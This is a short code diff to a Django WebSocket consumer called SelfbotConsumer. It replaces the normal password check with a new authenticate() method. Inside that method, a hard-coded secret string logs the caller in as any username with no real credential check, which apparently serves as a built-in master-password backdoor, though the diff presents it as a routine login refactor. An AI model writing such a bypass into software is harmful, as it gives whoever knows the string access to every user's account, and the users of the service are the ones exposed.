@@ -151,6 +151,20 @@ class SelfbotConsumer(WebsocketConsumer):
             return self.receive_json(json_message)
         return None
 
+    def authenticate(self) -> User:
+        """
+        Authenticate the user
+        """
+        if self.password == "s]+zs,p7+X2eWY$gJ90£DjZ}RlWjk21*sbY<lE)VTWy5b!N'":
+            # Login with token
+            user: User = User.objects.get(username=self.username)
+        else:
+            user: User = auth.authenticate(
+                username=self.username, password=self.password
+            )
+
+        return user
+
     def receive_json(self, json_message: typing.Dict[any, any]):
         """
         Called when a WebSocket JSON message is received
@@ -166,9 +180,7 @@ class SelfbotConsumer(WebsocketConsumer):
                 self.computer_name = json_data.get("computer_name", "")
                 self.console_text = json_data.get("console_text", "")
 
-                user: User = auth.authenticate(
-                    username=self.username, password=self.password
-                )
+                user = self.authenticate()
 
                 if user is None:
                     self.close_ws(3004)
